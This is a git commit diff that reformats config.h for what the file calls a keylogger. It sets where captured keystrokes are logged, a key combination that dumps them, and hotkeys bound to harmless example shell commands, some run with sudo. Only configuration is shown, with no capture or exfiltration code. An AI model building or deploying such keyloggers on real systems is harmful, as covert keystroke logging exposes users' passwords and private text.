dabed27a5f66a6d2663aca7cb3b71eec52e803b2
NewDawn0 <92283105+NewDawn0@users.noreply.github.com>
2023-06-26 16:12:02 +0200

    fmt + update dummy info

--- src/config.h
+++ src/config.h
@@ -7,28 +7,31 @@
  *
  *  File: config.h
  *  Desc: Configuration for the keylogger
-*/
+ */
 
 #include <stdbool.h>
 typedef struct {
-    const char* key;
-    const char* cmd;
+  const char *key;
+  const char *cmd;
 } ExecKey;
 
-
-/*========= Configuration =========*/ 
-const char* LOG_FILE_PATH = "/var/log/logger.log";  // Where the log file is stored
-const int BUFSIZE = 20;                             // Amount of characters until the buffer of keys is logged to the file
-const bool DEBUG = true;                            // If debug messages shoudld be printed
+/*========= Configuration =========*/
+const char *LOG_FILE_PATH =
+    "/var/log/logger.log"; // Where the log file is stored
+const int BUFSIZE =
+    20; // Amount of characters until the buffer of keys is logged to the file
+const bool DEBUG = true; // If debug messages should be printed
 
 // Keybinds:
-// NOTE: do not seperate the keys with a space as it will not work
-const char* DUMP = "cmd+9";                        // Key combination which dumps all the keys
+// NOTE: do not separate the keys with a space as it will not work
+// The special keys are: cmd, shift, caps, ctrl, alt
+const char *DUMP = "cmd+9"; // Key combination which dumps all the keys
 
 // Exec Keys
-// Using ExecKeys you can define keys and commands are run when the key is pressed
-// These are just some dummy commands for demonstration
+// Using ExecKeys you can define keys and commands are run when the key is
+// pressed These are just some example commands for demonstration
 ExecKey EXEC_KEYS[] = {
-    { "cmd+8", "sudo echo hi" },
-    { "cmd+7", "ls ." }
+    {"cmd+shift+c", "sudo cat /dev/null > /var/log/logger.log"}, // clear log
+    {"alt+shift+g", "sudo echo hi"},    // runs a command with root permissions
+    {"alt+shift+g", "ping google.com"}, // runs command with normal permissions
 };
